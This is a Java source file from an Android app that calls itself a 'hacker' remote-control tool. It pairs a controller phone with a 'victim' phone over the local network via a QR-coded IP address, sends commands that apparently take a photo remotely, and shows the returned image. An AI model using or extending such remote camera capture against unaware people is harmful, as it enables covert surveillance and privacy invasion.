package com.androidremote.hacker.tools;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;
import android.widget.ToggleButton;


import androidx.appcompat.app.AlertDialog;

import com.androidremote.hacker.R;
import com.androidremote.hacker.activities.Panel;

import net.glxn.qrgen.android.QRCode;

import java.io.IOException;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;

public class Commandes {

    public static AlertDialog mAlerte=null;
    public static int imgTaille;

    public static void victime(Activity act, Context context, ImageView mvu){
        String ip= InfoConnection.ip(act);
        if(ip == null){
            alerte(act,context, "Error","Connect your phone to a local network");
            return;
        }
        Intent i = new Intent(context, DOM.class);
        if (Remote.act!=null){
            try {
                CreateConnection.client.close();
                CreateConnection.server.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            act.stopService(i);

        }
        Bitmap vu = QRCode.from(ip).bitmap();
        mvu.setImageBitmap(vu);
        Remote.act=act;
        Remote.context=context;

        act.startService(i);
    }

    public static void stopVictime(Activity act, Context context){

        //Intent i = new Intent(context, DOM.class);
        //act.startService(i);
        Remote.act=null;
        Remote.context=null;
        showToast(act, context, "Victim disconnected");
    }

    public static void alerte(Activity act, Context context, String title, String message){
        AlertDialog.Builder m = new AlertDialog.Builder(context);
        m.setTitle(title).setMessage(message);
        m.setPositiveButton("OK", null);
        act.runOnUiThread(() ->
        m.show()
        );
    }

    public static void alerteCommand(Activity act, Context context, String title, String message){
        AlertDialog.Builder m = new AlertDialog.Builder(context);
        m.setTitle(title).setMessage(message).setCancelable(false);
        mAlerte = m.create();
        act.runOnUiThread(() ->
                mAlerte.show()
        );

    }

    public static void notalerteCommand(Activity act){
        if(mAlerte==null){
            return;
        }
        act.runOnUiThread(() ->
                mAlerte.dismiss()
        );
    }



    public static void alerteImage(Activity act, Context context, byte[] data){
        final View alertDialog= act.getLayoutInflater().inflate(R.layout.alert_picture, null);
        ImageView vu = (ImageView) alertDialog.findViewById(R.id.alert_picture);
        vu.setImageBitmap(BitmapFactory.decodeByteArray(data,0,data.length));
        //vu.setImageResource(R.drawable.ic_menu_share);
        AlertDialog.Builder m = new AlertDialog.Builder(context);
        //m.setTitle("Vu");
        m.setView(alertDialog);
        m.setPositiveButton("OK", null);

        act.runOnUiThread(() ->
                m.show()
        );
    }
    public static void hacker(Activity act, Context context, String ip){
        String monIp= InfoConnection.ip(act);
        InetAddress _ip = null,_monIp=null;
//        ip="192.168.43.64";
        if(ip ==null ){
            alerte(act,context, "Error","Connect your phone to a local network");
            return;
        }
        try {
            _ip = InetAddress.getByName(ip);
            _monIp = InetAddress.getByName(monIp);
        } catch (Exception e) {
            e.printStackTrace();
            alerte(act,context, "Error","Scanning give a incorrect result : \""+ip+"\"");
            return;
        }
        if (!isOnSameNet(_ip.getAddress(), _monIp.getAddress())){
            alerte(act,context, "Error","Not in a same Network!");
            return;
        }

        Remote.act=act;
        Remote.context=context;
        InfoConnection.aError=false;
        InfoConnection.isConnected=false;
        CreateConnection.connect(ip);
        act.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                while (InfoConnection.isConnected ==false && InfoConnection.aError == false){
                    Log.d("Pannel","looping");
                }
                if (InfoConnection.isConnected==true) {
                    Intent i = new Intent(context, Panel.class);
                    act.startActivity(i);
                }
            }
        });
        /*Intent i = new Intent(context, DOMSender.class);
        i.putExtra("IP",ip);
        act.startService(i);*/
    }
    public static boolean isOnSameNet(byte[] ip1, byte[] ip2){
        if (ip1[0] == ip2[0] && ip1[1] == ip2[1] && ip1[2] == ip2[2]){
            return true;
        }
        return false;
    }
    @TargetApi(Build.VERSION_CODES.M)
    public static void checkPermissions(Activity act, Context context) {
        final String[] requiredPermissions = {
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.CHANGE_WIFI_STATE,Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.WRITE_SETTINGS, Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.INTERNET,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.VIBRATE
        };
        final List<String> neededPermissions = new ArrayList<>();
        for (final String p : requiredPermissions) {
            if (context.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(p);
            }
        }
        if (!neededPermissions.isEmpty()) {
            act.requestPermissions(neededPermissions.toArray(new String[]{}),
                    1);
            Log.e("OKLM",neededPermissions.toArray(new String[]{}).toString());
        }
    }

    public static void showToast(Activity act, Context context, final String text) {
        act.runOnUiThread(() ->
                Toast.makeText(context, text, Toast.LENGTH_SHORT).show()
        );
    }


    public static void showPanelPicture(){
        new Thread(
                new Runnable() {
                    @Override
                    public void run() {
                        try {
//                            Commandes.notalerteCommand(Remote.panel_act);
                            if (CreateConnection.readString().equals("ERROR")){
                                Commandes.alerte(Remote.panel_act,Remote.panel_context, "Error",
                                        "Error when taking Image");
                                return;
                            }
                            Commandes.alerteCommand(Remote.panel_act,Remote.panel_context,
                                    "Image checking","Download Image");
                            CreateConnection.sendStrings("OK");
                            String a = CreateConnection.readString();
                            Log.e("SHOW IMAGE SERVICE","Readed image length");
                            CreateConnection.sendStrings("OK");
//                            Commandes.alerte(Remote.panel_act,Remote.panel_context,"Debug","a vaut : "+a+" et b vaut : "+b);

                            Log.e("SHOW IMAGE SERVICE","Prepare to read IMG length");
                            Remote.imgSended = new byte[Integer.parseInt(a)];
                            Log.e("SHOW IMAGE SERVICE","Read for "+String.valueOf(Remote.imgSended.length));
//                        Commandes.alerte(Remote.panel_act,Remote.panel_context, "Wait",
//                                "Data read is :"+String.valueOf(Remote.imgSended));
                            CreateConnection.readByte(0);
                            Commandes.notalerteCommand(Remote.panel_act);
                            Commandes.alerteImage(Remote.panel_act, Remote.panel_context, Remote.imgSended);
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                    }
                }
        ).start();
    }

    public static void startActivity(Activity act, Class a){
        Intent i = new Intent(act, a);
        act.startActivity(i);
    }

    public static void ImageProcess(ToggleButton vu) {
        new Thread(
                new Runnable() {
                    @Override
                    public void run() {
                        CreateConnection.sendStrings(vu.isChecked()? "PHDR" : "PHDV");
                    }
                }
        ).start();
//        Commandes.alerteCommand(Remote.panel_act,Remote.panel_context,"Image checking","Waiting for image");
        Commandes.showPanelPicture();
        /* new Handler().postDelayed(new Runnable(){
            @Override
            public void run(){
                Commandes.notalerteCommand(Remote.panel_act);
                Commandes.showPanelPicture();
            }
        },5000);*/
    }

    public static void destroy(Activity act, Context context){
        InfoConnection.isConnected = false;
        InfoConnection.aError = false;
    }
}
